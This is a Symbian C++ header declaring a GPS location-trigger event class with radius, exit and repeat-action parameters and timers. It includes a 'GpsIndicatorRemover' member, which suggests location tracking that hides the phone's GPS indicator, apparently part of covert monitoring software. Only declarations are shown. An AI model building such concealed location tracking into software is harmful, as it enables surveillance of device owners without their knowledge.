/*
 ============================================================================
 Name		: EventLocation.h
 Author	  : Marco Bellino
 Version	 : 1.0
 Copyright   : Your copyright notice
 Description : CEventTimer declaration
 ============================================================================
 */

#ifndef EVENTLOCATION_H
#define EVENTLOCATION_H

// INCLUDES
#include <e32std.h>
#include <e32base.h>

#include "AbstractEvent.h"
#include <HT\GPSPosition.h>
#include <HT\TimeOutTimer.h>
#include "GpsIndicatorRemover.h"

// CLASS DECLARATION

typedef struct TLocationStruct
	{
	TInt iExitAction;
	TInt iRepeatAction;
	TInt iIter;
	TInt iDelay;
	TInt	iConfDistance;
	TReal64 iLatOrigin;	
	TReal64	iLonOrigin;	
	TLocationStruct()
		{
		iExitAction = -1;
		iRepeatAction = -1;
		iIter = -1;
		iDelay = -1;
		iConfDistance = 0;
		iLatOrigin = 0;
		iLonOrigin = 0;
		}
	} TLocationStruct;

	
/**
 *  CEventTimer
 * 
 */
class CEventLocation : public CAbstractEvent, public MPositionerObserver, public MTimeOutNotifier
	{
public:
	// Constructors and destructor

	/**
	 * Destructor.
	 */
	~CEventLocation();

	/**
	 * Two-phased constructor.
	 */
	static CEventLocation* NewL(const TDesC8& params, TUint32 aTriggerId);

	/**
	 * Two-phased constructor.
	 */
	static CEventLocation* NewLC(const TDesC8& params, TUint32 aTriggerId);

protected:
	// From CAbstractEvent
	/**
	 * Events MUST implement this method to start their task.
	 */
	virtual void StartEventL();
	/**
	 * Events MUST implement this method to stop their task.
	 */
	virtual void StopEventL();

private:

	/**
	 * Constructor for performing 1st stage construction
	 */
	CEventLocation(TUint32 aTriggerId);

	/**
	 * EPOC default constructor for performing 2nd stage construction
	 */
	void ConstructL(const TDesC8& params);

	// From MPositionerObserver
	//virtual void HandleGPSPositionL(TPosition position);   // original MB
	virtual void HandleGPSPositionL(TPositionSatelliteInfo position);
	virtual void HandleGPSErrorL(TInt error);
	
	// From MTimeOutNotifier
	virtual void TimerExpiredL(TAny* src);
		
	
private:
	TBool iWasInsideRadius;
	CGPSPosition* iGPS;
	TLocationStruct iLocationParams;
	
	CGpsIndicatorRemover* iGpsIndicatorRemover;
	
	// timer for repeat action
	CTimeOutTimer* iTimerRepeat;
	TTime iTimeAtRepeat;
	TTimeIntervalSeconds iSecondsIntervRepeat;
	TInt iSteps;
		
	};

#endif // EVENTLocation_H
